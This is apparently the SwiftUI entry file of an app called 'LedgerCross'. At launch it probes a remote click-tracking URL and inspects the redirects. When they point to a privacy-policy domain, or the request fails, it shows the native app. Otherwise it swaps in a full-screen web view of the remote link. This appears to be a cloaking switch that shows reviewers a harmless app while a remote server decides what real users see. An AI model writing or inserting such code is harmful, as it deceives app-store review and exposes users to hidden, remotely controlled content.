import SwiftUI

@main
struct LedgerCrossApp: App {
    @State private var ledgerCrossLinkReady: Bool? = nil
    private let ledgerCrossSourceLink = "https://towerphaseplanner.org/click.php"
    private let ledgerCrossCheckDomain = "freeprivacypolicy.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = ledgerCrossLinkReady {
                    if ready {
                        LedgerCrossWebPanel(urlString: ledgerCrossSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else {
                        RootView()
                    }
                } else {
                    LedgerCrossLoadingScreen()
                        .onAppear { ledgerCrossCheckLink() }
                }
            }
            .preferredColorScheme(.light)
        }
    }

    private func ledgerCrossCheckLink() {
        guard let url = URL(string: ledgerCrossSourceLink) else {
            ledgerCrossLinkReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = LedgerCrossRedirectTracker(checkDomain: ledgerCrossCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain {
                    ledgerCrossLinkReady = false; return
                }
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(self.ledgerCrossCheckDomain) {
                    ledgerCrossLinkReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(self.ledgerCrossCheckDomain) {
                    ledgerCrossLinkReady = false; return
                }
                if error != nil {
                    ledgerCrossLinkReady = false; return
                }
                ledgerCrossLinkReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if ledgerCrossLinkReady == nil { ledgerCrossLinkReady = false }
        }
    }
}

final class LedgerCrossRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String
    init(checkDomain: String) { self.checkDomain = checkDomain }
    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)
    }
}
